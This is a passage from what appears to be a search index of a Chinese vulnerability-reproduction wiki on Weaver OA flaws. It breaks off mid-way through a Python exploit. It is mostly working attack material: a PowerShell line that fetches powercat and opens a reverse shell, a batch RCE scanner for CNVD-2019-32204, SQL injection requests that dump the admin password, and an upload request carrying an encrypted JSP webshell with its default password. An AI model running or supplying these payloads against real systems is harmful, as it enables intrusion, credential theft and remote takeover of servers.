%2b \"ec(\\\"whoami\\\")\" ) ; ex \\u 0065c ( \"cmd /c dir\" ) ; IEX ( New-Object System.Net.Webclient ) .DownloadString ( 'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1' ) ; powercat -c ip -p 6666 -e cmd","title":"\u5173\u4e8e\u7ed5\u8fc7"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20Bsh%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2019-32204/#\u6f0f\u6d1epoc","text":"https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204 #/usr/bin/python #coding:utf-8 #Author:Ja0k #For Weaver-Ecology-OA_RCE import urllib3 urllib3 . disable_warnings ( urllib3 . exceptions . InsecureRequestWarning ) import requests , sys headers = { 'Content-Type' : 'text/xml; charset=utf-8' , 'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' , 'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0' , 'Cache-Control' : 'max-age=0' , 'Content-Type' : 'application/x-www-form-urlencoded' , 'Upgrade-Insecure-Requests' : '1' , 'Content-Length' : '578' } proxies = { 'http' : 'http://127.0.0.1:8080' } def Poc_check ( target ): Url_Payload1 = \"/bsh.servlet.BshServlet\" Url_Payload2 = \"/weaver/bsh.servlet.BshServlet\" Url_Payload3 = \"/weaveroa/bsh.servlet.BshServlet\" Url_Payload4 = \"/oa/bsh.servlet.BshServlet\" Data_Payload1 = \"\"\"bsh.script=exec(\"whoami\");&bsh.servlet.output=raw\"\"\" Data_Payload2 = \"\"\"bsh.script= \\u0065\\u0078\\u0065\\u0063 (\"whoami\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw\"\"\" Data_Payload3 = \"\"\"bsh.script=eval%00(\"ex\"%2b\"ec(bsh.httpServletRequest.getParameter( \\\\ \"command \\\\ \"))\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=whoami\"\"\" for Url_Payload in ( Url_Payload1 , Url_Payload2 , Url_Payload3 , Url_Payload4 ): url = target + Url_Payload for Data_payload in ( Data_Payload1 , Data_Payload2 , Data_Payload3 ): try : http_response = requests . post ( url , data = Data_payload , headers = headers , verify = False ) #print http_response.status_code if http_response . status_code == 200 : if \";</script>\" not in ( http_response . content ): if \"Login.jsp\" not in ( http_response . content ): if \"Error\" not in ( http_response . content ): print \" {0} is a E-cologyOA_RCE Vulnerability\" . format ( url ) print \"Server Current Username\uff1a {0} \" . format ( http_response . content ) elif http_response . status_code == 500 : print \" {0} 500 maybe is Weaver-EcologyOA\uff0cPlease confirm by yourself \" . format ( url ) else : pass except Exception , Error : pass if __name__ == '__main__' : for line in open ( sys . argv [ 1 ]) . readlines (): target = line . strip () Poc_check ( target ) #1.install python Dependencies Library pip install requests #2.\u6279\u91cf\u811a\u672c \u6267\u884c python Weaver-Ecology-OA_RCE-exp.py url.txt\u6587\u4ef6\u4e2d \u662furl\u5730\u5740 \u9700\u8981\u5e26http\u534f\u8bae \u6709\u4efb\u4f55\u95ee\u9898\u8bf7issue","title":"\u6f0f\u6d1ePOC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20V8%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u6cdb\u5faeOA V8 SQL\u6ce8\u5165\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u6cdb\u5faeOA V8 \u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6f0f\u6d1e\u83b7\u53d6\u7ba1\u7406\u5458\u6743\u9650\u548c\u670d\u52a1\u5668\u6743\u9650 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u6cdb\u5faeOA V8 FOFA \u00b6 [!NOTE] app=\"\u6cdb\u5fae-\u534f\u540c\u529e\u516cOA\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u5728getdata.jsp\u4e2d\uff0c\u76f4\u63a5\u5c06request\u5bf9\u8c61\u4ea4\u7ed9 **weaver.hrm.common.AjaxManager.getData(HttpServletRequest, ServletContext) : ** \u65b9\u6cd5\u5904\u7406 \u5728getData\u65b9\u6cd5\u4e2d\uff0c\u5224\u65ad\u8bf7\u6c42\u91cccmd\u53c2\u6570\u662f\u5426\u4e3a\u7a7a\uff0c\u5982\u679c\u4e0d\u4e3a\u7a7a\uff0c\u8c03\u7528proc\u65b9\u6cd5 Proc\u65b9\u6cd54\u4e2a\u53c2\u6570\uff0c(\u201c\u7a7a\u5b57\u7b26\u4e32\u201d,\u201dcmd\u53c2\u6570\u503c\u201d,request\u5bf9\u8c61\uff0cserverContext\u5bf9\u8c61) \u5728proc\u65b9\u6cd5\u4e2d\uff0c\u5bf9cmd\u53c2\u6570\u503c\u8fdb\u884c\u5224\u65ad\uff0c\u5f53cmd\u503c\u7b49\u4e8egetSelectAllId\u65f6\uff0c\u518d\u4ece\u8bf7\u6c42\u4e2d\u83b7\u53d6sql\u548ctype\u4e24\u4e2a\u53c2\u6570\u503c\uff0c\u5e76\u5c06\u53c2\u6570\u4f20\u9012\u8fdbgetSelectAllIds\uff08sql,type\uff09\u65b9\u6cd5\u4e2d \u6839\u636e\u4ee5\u4e0a\u4ee3\u7801\u6d41\u7a0b\uff0c\u53ea\u8981\u6784\u9020\u8bf7\u6c42\u53c2\u6570 ?cmd= getSelectAllId&sql=select password as id from userinfo; \u5373\u53ef\u5b8c\u6210\u5bf9\u6570\u636e\u5e93\u64cd\u63a7 POC http://xxx.xxx.xxx.xxx/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager \u67e5\u8be2HrmResourceManager\u8868\u4e2d\u7684password\u5b57\u6bb5\uff0c\u9875\u9762\u4e2d\u8fd4\u56de\u4e86\u6570\u636e\u5e93\u7b2c\u4e00\u6761\u8bb0\u5f55\u7684\u503c\uff08sysadmin\u7528\u6237\u7684password\uff09 \u89e3\u5bc6\u540e\u5373\u53ef\u767b\u5f55\u7cfb\u7edf Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Weaver OA 8 SQL injection","title":"\u6cdb\u5faeOA V8 SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20V8%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6cdb\u5faeoa-v8-sql\u6ce8\u5165\u6f0f\u6d1e","text":"","title":"\u6cdb\u5faeOA V8 SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20V8%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u6cdb\u5faeOA V8 \u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6f0f\u6d1e\u83b7\u53d6\u7ba1\u7406\u5458\u6743\u9650\u548c\u670d\u52a1\u5668\u6743\u9650","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20V8%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u6cdb\u5faeOA V8","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20V8%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] app=\"\u6cdb\u5fae-\u534f\u540c\u529e\u516cOA\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20V8%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u5728getdata.jsp\u4e2d\uff0c\u76f4\u63a5\u5c06request\u5bf9\u8c61\u4ea4\u7ed9 **weaver.hrm.common.AjaxManager.getData(HttpServletRequest, ServletContext) : ** \u65b9\u6cd5\u5904\u7406 \u5728getData\u65b9\u6cd5\u4e2d\uff0c\u5224\u65ad\u8bf7\u6c42\u91cccmd\u53c2\u6570\u662f\u5426\u4e3a\u7a7a\uff0c\u5982\u679c\u4e0d\u4e3a\u7a7a\uff0c\u8c03\u7528proc\u65b9\u6cd5 Proc\u65b9\u6cd54\u4e2a\u53c2\u6570\uff0c(\u201c\u7a7a\u5b57\u7b26\u4e32\u201d,\u201dcmd\u53c2\u6570\u503c\u201d,request\u5bf9\u8c61\uff0cserverContext\u5bf9\u8c61) \u5728proc\u65b9\u6cd5\u4e2d\uff0c\u5bf9cmd\u53c2\u6570\u503c\u8fdb\u884c\u5224\u65ad\uff0c\u5f53cmd\u503c\u7b49\u4e8egetSelectAllId\u65f6\uff0c\u518d\u4ece\u8bf7\u6c42\u4e2d\u83b7\u53d6sql\u548ctype\u4e24\u4e2a\u53c2\u6570\u503c\uff0c\u5e76\u5c06\u53c2\u6570\u4f20\u9012\u8fdbgetSelectAllIds\uff08sql,type\uff09\u65b9\u6cd5\u4e2d \u6839\u636e\u4ee5\u4e0a\u4ee3\u7801\u6d41\u7a0b\uff0c\u53ea\u8981\u6784\u9020\u8bf7\u6c42\u53c2\u6570 ?cmd= getSelectAllId&sql=select password as id from userinfo; \u5373\u53ef\u5b8c\u6210\u5bf9\u6570\u636e\u5e93\u64cd\u63a7 POC http://xxx.xxx.xxx.xxx/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager \u67e5\u8be2HrmResourceManager\u8868\u4e2d\u7684password\u5b57\u6bb5\uff0c\u9875\u9762\u4e2d\u8fd4\u56de\u4e86\u6570\u636e\u5e93\u7b2c\u4e00\u6761\u8bb0\u5f55\u7684\u503c\uff08sysadmin\u7528\u6237\u7684password\uff09 \u89e3\u5bc6\u540e\u5373\u53ef\u767b\u5f55\u7cfb\u7edf","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20V8%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Weaver OA 8 SQL injection","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20V9%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","text":"\u6cdb\u5faeOA V9 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u6cdb\u5faeOA V9 \u5b58\u5728\u6587\u4ef6\u4e0a\u4f20\u63a5\u53e3\u5bfc\u81f4\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u6cdb\u5faeOA V9 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6f0f\u6d1e\u4f4d\u4e8e: /page/exportImport/uploadOperation.jsp\u6587\u4ef6\u4e2d Jsp\u6d41\u7a0b\u5927\u6982\u662f:\u5224\u65ad\u8bf7\u6c42\u662f\u5426\u662fmultipart\u8bf7\u6c42,\u7136\u5c31\u6ca1\u6709\u4e86,\u76f4\u63a5\u4e0a\u4f20\u4e86,\u554a\u54c8\u54c8\u54c8\u54c8\u54c8 \u91cd\u70b9\u5173\u6ce8File file=new File(savepath+filename), Filename\u53c2\u6570,\u662f\u524d\u53f0\u53ef\u63a7\u7684,\u5e76\u4e14\u6ca1\u6709\u505a\u4efb\u4f55\u8fc7\u6ee4\u9650\u5236 \u5229\u7528\u975e\u5e38\u7b80\u5355,\u53ea\u8981\u5bf9\u7740 127.0.0.1/page/exportImport/uploadOperation.jsp \u6765\u4e00\u4e2amultipartRequest\u5c31\u53ef\u4ee5,\u5229\u7528\u7b80\u5355,\u81ea\u8bc4\u9ad8\u5371!! \u7136\u540e\u8bf7\u6c42 \u7136\u540e\u8bf7\u6c42\u8def\u5f84: page/exportImport/fileTransfer/1.jsp \u8bf7\u6c42\u5305 POST /page/exportImport/uploadOperation.jsp HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 397 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68 Origin: null Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6XgyjB6SeCArD3Hc Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 dnt: 1 x-forwarded-for: 127.0.0.1 Connection: close ------WebKitFormBoundary6XgyjB6SeCArD3Hc Content-Disposition: form-data; name=\"file\"; filename=\"peiqi.jsp\" Content-Type: application/octet-stream <%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%> ------WebKitFormBoundary6XgyjB6SeCArD3Hc-- \u5730\u5740: /page/exportImport/fileTransfer/peiqi.jsp \u9ed8\u8ba4\u5bc6\u7801 rebeyond","title":"\u6cdb\u5faeOA V9 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20V9%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#\u6cdb\u5faeoa-v9-\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20","text":"","title":"\u6cdb\u5faeOA V9 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20V9%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u6cdb\u5faeOA V9 \u5b58\u5728\u6587\u4ef6\u4e0a\u4f20\u63a5\u53e3\u5bfc\u81f4\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20V9%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u6cdb\u5faeOA V9","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20V9%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6f0f\u6d1e\u4f4d\u4e8e: /page/exportImport/uploadOperation.jsp\u6587\u4ef6\u4e2d Jsp\u6d41\u7a0b\u5927\u6982\u662f:\u5224\u65ad\u8bf7\u6c42\u662f\u5426\u662fmultipart\u8bf7\u6c42,\u7136\u5c31\u6ca1\u6709\u4e86,\u76f4\u63a5\u4e0a\u4f20\u4e86,\u554a\u54c8\u54c8\u54c8\u54c8\u54c8 \u91cd\u70b9\u5173\u6ce8File file=new File(savepath+filename), Filename\u53c2\u6570,\u662f\u524d\u53f0\u53ef\u63a7\u7684,\u5e76\u4e14\u6ca1\u6709\u505a\u4efb\u4f55\u8fc7\u6ee4\u9650\u5236 \u5229\u7528\u975e\u5e38\u7b80\u5355,\u53ea\u8981\u5bf9\u7740 127.0.0.1/page/exportImport/uploadOperation.jsp \u6765\u4e00\u4e2amultipartRequest\u5c31\u53ef\u4ee5,\u5229\u7528\u7b80\u5355,\u81ea\u8bc4\u9ad8\u5371!! \u7136\u540e\u8bf7\u6c42 \u7136\u540e\u8bf7\u6c42\u8def\u5f84: page/exportImport/fileTransfer/1.jsp \u8bf7\u6c42\u5305 POST /page/exportImport/uploadOperation.jsp HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 397 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68 Origin: null Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6XgyjB6SeCArD3Hc Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 dnt: 1 x-forwarded-for: 127.0.0.1 Connection: close ------WebKitFormBoundary6XgyjB6SeCArD3Hc Content-Disposition: form-data; name=\"file\"; filename=\"peiqi.jsp\" Content-Type: application/octet-stream <%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%> ------WebKitFormBoundary6XgyjB6SeCArD3Hc-- \u5730\u5740: /page/exportImport/fileTransfer/peiqi.jsp \u9ed8\u8ba4\u5bc6\u7801 rebeyond","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20WorkflowCenterTreeData%E6%8E%A5%E5%8F%A3SQL%E6%B3%A8%E5%85%A5/","text":"\u6cdb\u5faeOA WorkflowCenterTreeData\u63a5\u53e3SQL\u6ce8\u5165(\u4ec5\u9650oracle\u6570\u636e\u5e93) CNVD-2019-34241 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 2019\u5e7410\u670810\u65e5CNVD\u53d1\u5e03\u4e86\u6cdb\u5faee-cology OA\u7cfb\u7edf\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u662f\u7531\u4e8eOA\u7cfb\u7edf\u7684WorkflowCenterTreeData\u63a5\u53e3\u4e2d\u6d89\u53caOracle\u6570\u636e\u5e93\u7684SQL\u8bed\u53e5\u7f3a\u4e4f\u5b89\u5168\u68c0\u67e5\u63aa\u65bd\u6240\u5bfc\u81f4\u7684\uff0c\u4efb\u610f\u653b\u51fb\u8005\u90fd\u53ef\u501fSQL\u8bed\u53e5\u62fc\u63a5\u65f6\u673a\u6ce8\u5165\u6076\u610fpayload\uff0c\u9020\u6210SQL\u6ce8\u5165\u653b\u51fb\u3002 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] \u4f7f\u7528Oracle\u6570\u636e\u5e93\u7684\u6cdb\u5fae\u670d\u52a1 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6cdb\u578b\u5fae\u751f\u6001OA\u7cfb\u7edf\u7684WorkflowCenterTreeData\u63a5\u53e3\u5728\u4f7f\u7528Oracle\u6570\u636e\u5e93\u65f6\uff0c\u7531\u4e8e\u5185\u7f6esql\u8bed\u53e5\u5206\u89e3\u4e0d\u4e25\u5bc6\uff0c\u5bfc\u81f4\u5176\u5b58\u5728\u7684sql\u6ce8\u5165\u6f0f\u6d1e \u6f0f\u6d1e\u8bf7\u6c42\u5305 POST / mobile / browser / WorkflowCenterTreeData . jsp ? node = wftype_1 & scope = 2333 HTTP / 1 . 1 Host : ip : port Cache - Control : max - age = 0 Upgrade - Insecure - Requests : 1 User - Agent : Mozilla / 5 . 0 ( Windows NT 10 . 0 ; Win64 ; x64 ) AppleWebKit / 537 . 36 ( KHTML , like Gecko ) Chrome / 74 . 0 . 3729 . 131 Safari / 537 . 36 Accept : text / html , application / xhtml + xml , application / xml ; q = 0 . 9 , image / webp , image / apng , * /*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: ecology_JSessionId=abc49y8JvMcoqhSkCv02w; testBanCookie=test Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 2236 Upgrade-Insecure-Requests: 1 formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1 \u6f0f\u6d1e\u5229\u7528POC \u00b6 import requests import sys headers = { 'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25' , 'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' , 'Accept-Language' : 'zh-CN,zh;q=0.9' , 'Content-Type' : 'application/x-www-form-urlencoded' } def exploit ( url ): target = url + '/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333' payload = \"formids=11111111111))) 